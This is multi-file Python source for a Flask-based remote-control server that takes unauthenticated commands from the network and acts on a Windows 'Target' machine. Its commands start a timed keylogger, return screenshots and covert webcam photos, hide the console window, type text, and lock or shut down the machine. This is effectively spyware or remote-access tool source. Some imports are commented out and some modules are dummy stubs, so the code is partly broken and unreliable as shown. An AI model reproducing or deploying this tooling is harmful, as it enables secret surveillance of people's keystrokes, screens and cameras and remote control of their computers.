# === app.py ===
from flask import Flask, request, send_file
# from handlers import process_command  # Import command handler from another file

app = Flask(__name__)

@app.route("/", methods=["POST"])
@app.route("/functions", methods=["POST"])
def handle_command():
    text = request.form["text"]           # Receive the command from POST form
    response = process_command(text)      # Process and execute the command
    return response                       # Return the result

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)  # Run Flask server


# === handlers.py ===
import os
import threading
import subprocess
import pyautogui as pag
import webbrowser as web
import psutil
import cv2
import win32gui, win32con
from flask import send_file

import osi
import vol
import voice
# from logger import logger
# from hostname import hostname

def process_command(text: str):
    text = text.lower()
    original_text = text

    def respond(msg):
        return msg % hostname

    def replace_and_trim(cmd):
        return text.replace(f"{cmd} ", "")

    if osi.conditioner(1, text, "!unmute", 1) == "true":
        vol.v(replace_and_trim("!unmute"), 1)
        return f"Target unmuted on {hostname}"

    elif osi.conditioner(1, text, "!mute", 1) == "true":
        vol.v(replace_and_trim("!mute"), 0)
        return f"Target muted on {hostname}"

    elif osi.conditioner(1, text, "!lock", 1) == "true":
        subprocess.call('rundll32.exe user32.dll, LockWorkStation')
        return respond("%s locked")

    elif osi.conditioner(1, text, "!sleep", 1) == "true":
        os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
        return respond("%s going to sleep")

    elif osi.conditioner(1, text, "!restart", 1) == "true":
        subprocess.call(["shutdown", "/r"])
        return respond("%s restarting")

    elif osi.conditioner(1, text, "!shutdown", 1) == "true":
        subprocess.call(["shutdown", "/s"])
        return respond("%s shutting down")

    elif osi.conditioner(1, text, "!play", 1) == "true" or osi.conditioner(1, text, "!pause", 1) == "true":
        pag.hotkey('playpause')
        return respond("Media toggled on %s")

    elif osi.conditioner(1, text, "!write", 1) == "true":
        pag.write(replace_and_trim("!write"))
        return f"Text written on {hostname}"

    elif osi.conditioner(1, text, "!say male", 2) == "true":
        voice.out(replace_and_trim("!say male"), 0, 170)
        return respond("Speaking with male voice on %s")

    elif osi.conditioner(1, text, "!say female", 2) == "true":
        voice.out(replace_and_trim("!say female"), 1, 170)
        return respond("Speaking with female voice on %s")

    elif osi.conditioner(1, text, "!keylogger", 1) == "true":
        mins = int(replace_and_trim("!keylogger") or 1)
        threading.Thread(target=logger, args=(mins,)).start()
        return f"Keylogger started on {hostname} for {mins} minute(s)"

    elif osi.conditioner(1, text, "!hide", 1) == "true":
        hwnd = win32gui.GetForegroundWindow()
        win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
        return respond("Console hidden on %s")

    elif osi.conditioner(1, text, "!link", 1) == "true":
        web.open(replace_and_trim("!link"))
        return "URL opened!"

    elif osi.conditioner(1, text, "!screenshot", 1) == "true":
        path = os.path.join(os.getcwd(), "templates/screenshot.png")
        pag.screenshot().save(path)
        return send_file(path, mimetype='image/gif')

    elif osi.conditioner(1, text, "!picture", 1) == "true":
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        if ret:
            cv2.imwrite("pic.png", frame)
            cam.release()
            cv2.destroyAllWindows()
            return send_file("pic.png", mimetype='image/gif')

    elif osi.conditioner(1, text, "!battery", 1) == "true":
        return str(psutil.sensors_battery().percent)

    elif osi.conditioner(1, text, "!close current", 2) == "true":
        pag.hotkey('alt', 'f4')
        return respond("Closed current window on %s")

    elif osi.conditioner(1, text, "!commands", 1) == "true":
        return send_file("templates/commands.png", mimetype='image/gif')

    return f"'{original_text}' Unknown command!"


# === logger.py ===
from pynput import keyboard
import time

def logger(duration):
    end_time = time.time() + duration * 60
    with open("keylog.txt", "w") as f:
        def on_press(key):
            if time.time() > end_time:
                return False
            f.write(f"{key}\n")
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()


# === hostname.py ===
hostname = "Sushant-PC"


# === osi.py ===
# Dummy function for parsing logic

def conditioner(level, text, keyword, threshold):
    if keyword in text:
        return "true"
    return "false"


# === vol.py ===
# Dummy volume module

def v(target, state):
    print(f"Volume {'unmuted' if state == 1 else 'muted'} for {target}")


# === voice.py ===
import pyttsx3

def out(text, gender, rate):
    engine = pyttsx3.init()
    voices = engine.getProperty('voices')
    engine.setProperty('voice', voices[gender].id)
    engine.setProperty('rate', rate)
    engine.say(text)
    engine.runAndWait()
